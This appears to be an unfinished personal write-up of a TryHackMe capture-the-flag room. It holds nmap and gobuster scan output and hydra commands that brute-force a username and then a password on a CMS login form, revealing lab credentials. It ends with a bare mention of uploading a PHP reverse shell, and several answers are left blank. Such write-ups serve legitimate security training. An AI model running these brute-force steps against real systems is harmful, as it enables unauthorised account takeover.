https://tryhackme.com/room/easyctf

## Task 1

### How many services are running under port 1000?

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 04:12 EDT
Nmap scan report for 10.10.83.63
Host is up (0.38s latency).
Not shown: 997 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 22.25 seconds

```

### What is running on the higher port?

```
---------------------Starting Nmap Basic Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 04:12 EDT
Nmap scan report for 10.10.83.63
Host is up (0.37s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.3.120.86
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.60 seconds

```

ssh

### What's the CVE you're using against the application?


```

```

### To what kind of vulnerability is the application vulnerable?

### What's the password?

found /simple

```
---------------------Running Recon Commands----------------------
                                                                                                                                                                                       

Starting gobuster scan
                                                                                                                                                                                       
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.83.63:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     php,html
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/07/27 04:33:51 Starting gobuster
===============================================================
http://10.10.83.63:80/.hta (Status: 403) [Size: 290]
http://10.10.83.63:80/.hta.html (Status: 403) [Size: 295]
http://10.10.83.63:80/.hta.php (Status: 403) [Size: 294]
http://10.10.83.63:80/.htaccess (Status: 403) [Size: 295]
http://10.10.83.63:80/.htaccess.html (Status: 403) [Size: 300]
http://10.10.83.63:80/.htaccess.php (Status: 403) [Size: 299]
http://10.10.83.63:80/.htpasswd (Status: 403) [Size: 295]
http://10.10.83.63:80/.htpasswd.html (Status: 403) [Size: 300]
http://10.10.83.63:80/.htpasswd.php (Status: 403) [Size: 299]
http://10.10.83.63:80/index.html (Status: 200) [Size: 11321]
http://10.10.83.63:80/index.html (Status: 200) [Size: 11321]
http://10.10.83.63:80/robots.txt (Status: 200) [Size: 929]
http://10.10.83.63:80/server-status (Status: 403) [Size: 299]
http://10.10.83.63:80/simple (Status: 301) [Size: 311]
===============================================================
2020/07/27 04:40:06 Finished
===============================================================

```

run sqlmap, does not appear to be injectable

try to bruteforce the username using the forgot password form

```
kali@kali:~/Downloads$ hydra -L allnames.txt -p test 10.10.83.63 -t 4 http-form-post "/simple/admin/login.php?forgotpw=1:forgottenusername=^USER^&forgotpwform=1&loginsubmit=Submit:F=Found" 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 04:54:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8295455 login tries (l:8295455/p:1), ~2073864 tries per task
[DATA] attacking http-post-form://10.10.83.63:80/simple/admin/login.php?forgotpw=1:forgottenusername=^USER^&forgotpwform=1&loginsubmit=Submit:F=Found
[STATUS] 129.00 tries/min, 129 tries in 00:01h, 8295326 to do in 1071:45h, 4 active
[STATUS] 130.00 tries/min, 390 tries in 00:03h, 8295065 to do in 1063:29h, 4 active
[STATUS] 132.14 tries/min, 925 tries in 00:07h, 8294530 to do in 1046:10h, 4 active
[80][http-post-form] host: 10.10.83.63   login: mitch   password: test
```
we found the username, now brute force the password

```
kali@kali:~/Downloads$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.83.63 -t 4 http-form-post "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect" 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 05:13:01
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-post-form://10.10.83.63:80/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect
[80][http-post-form] host: 10.10.83.63   login: mitch   password: secret
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-27 05:13:38
```
file manager > upload php reverse shell

### Where can you login with the details obtained?

### What's the user flag?

### Is there any other user in the home directory? What's its name?

### What can you leverage to spawn a privileged shell?

### What's the root flag?
